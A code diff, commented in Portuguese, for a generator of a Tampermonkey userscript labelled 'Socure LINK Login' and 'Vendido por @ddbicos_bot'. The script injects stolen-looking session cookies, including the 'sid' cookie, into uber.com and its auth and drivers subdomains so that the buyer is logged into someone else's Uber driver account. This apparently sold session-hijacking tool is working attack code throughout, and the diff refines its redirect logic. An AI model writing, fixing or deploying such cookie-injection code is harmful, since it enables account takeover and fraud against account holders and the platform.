@@ -54,9 +54,8 @@ export function buildTampermonkeyScript(cookies: Cookie[]): string {
     return `[${name},${value},${domain},${secure},${httpOnly},${expires}]`;
   });
 
-  // extrai o valor do sid desta conta para usar como fingerprint
+  // fingerprint = primeiros 20 chars do sid desta conta
   const sidCookie = filtered.find((c) => c.name === 'sid' && c.domain.replace(/^\./, '') === 'uber.com');
-  // usa os primeiros 20 chars do sid como fingerprint — suficiente para identificar a conta
   const sidFingerprint = sidCookie ? JSON.stringify(sidCookie.value.slice(0, 20)) : '""';
 
   const cArray = `[${rows.join(',')}]`;
@@ -65,7 +64,7 @@ export function buildTampermonkeyScript(cookies: Cookie[]): string {
     '// ==UserScript==',
     '// @name         Socure LINK Login',
     '// @namespace    User Name',
-    '// @version      4.8',
+    '// @version      4.9',
     '// @description  Vendido por @ddbicos_bot',
     '// @match        https://uber.com/*',
     '// @match        https://*.uber.com/*',
@@ -77,6 +76,17 @@ export function buildTampermonkeyScript(cookies: Cookie[]): string {
     '// ==/UserScript==',
   ].join('\n');
 
+  /*
+   * Lógica auth.uber.com (v4.9):
+   *
+   * Caso A – sid do browser bate com SID_FP (esta conta já está injetada):
+   *   → deixa o Uber agir normalmente (não redireciona nada).
+   *     Se o Uber está no auth mesmo com o sid correto, ele vai processar
+   *     e redirecionar sozinho para drivers. Interferir aqui causava o loop.
+   *
+   * Caso B – sid ausente ou é de outra conta:
+   *   → injeta todos os cookies desta conta e redireciona para drivers/?sl=1.
+   */
   const body =
     `(function(){` +
     `var H=window.location.hostname;` +
@@ -92,7 +102,7 @@ export function buildTampermonkeyScript(cookies: Cookie[]): string {
       `else if(cb){cb();}` +
     `};` +
     `var rel=C.filter(function(c){return ok(c[2]);});` +
-    `console.log('[SocureLink] H=',H,'rel:',rel.length);` +
+    `console.log('[SocureLink] H=',H,'rel:',rel.length,'P=',P);` +
 
     // ── DESTINO: drivers.uber.com?sl=1 ──
     `if(H==='drivers.uber.com'&&P.indexOf('sl=1')!==-1){` +
@@ -107,23 +117,18 @@ export function buildTampermonkeyScript(cookies: Cookie[]): string {
     `}` +
 
     // ── drivers.uber.com sem ?sl=1: normal ──
-    `if(H==='drivers.uber.com'){console.log('[SocureLink] drivers normal.');return;}` +
+    `if(H==='drivers.uber.com'){console.log('[SocureLink] drivers normal, sem acao.');return;}` +
 
-    // ── auth.uber.com: verifica se o sid do browser é DESTA conta ──
+    // ── auth.uber.com ──
     `if(H==='auth.uber.com'){` +
-      // lê o valor do sid do browser
       `var browserSid='';` +
-      `try{` +
-        `var m=document.cookie.match(/(?:^|;\\s*)sid=([^;]*)/);` +
-        `if(m)browserSid=decodeURIComponent(m[1]).slice(0,20);` +
-      `}catch(x){}` +
-      // só para se o sid do browser bater com o fingerprint DESTA conta
+      `try{var m=document.cookie.match(/(?:^|;\\s*)sid=([^;]*)/);if(m)browserSid=decodeURIComponent(m[1]).slice(0,20);}catch(x){}` +
+      // Caso A: sid desta conta já presente → não faz nada, deixa Uber agir
       `if(SID_FP&&browserSid===SID_FP){` +
-        `console.log('[SocureLink] auth: sid desta conta já presente, indo direto para drivers...');` +
-        `location.replace('https://drivers.uber.com/?sl=1');` +
+        `console.log('[SocureLink] auth: sid desta conta presente, deixando Uber agir.');` +
         `return;` +
       `}` +
-      // sid ausente ou de outra conta — injeta os cookies desta
+      // Caso B: sid ausente ou de outra conta → injeta e vai para drivers/?sl=1
       `var tot1=rel.length,c1=0,f1=false;` +
       `var go1=function(){if(f1)return;f1=true;console.log('[SocureLink] auth→drivers('+c1+'/'+tot1+')');location.replace('https://drivers.uber.com/?sl=1');};` +
       `var t1=setTimeout(go1,2500);` +
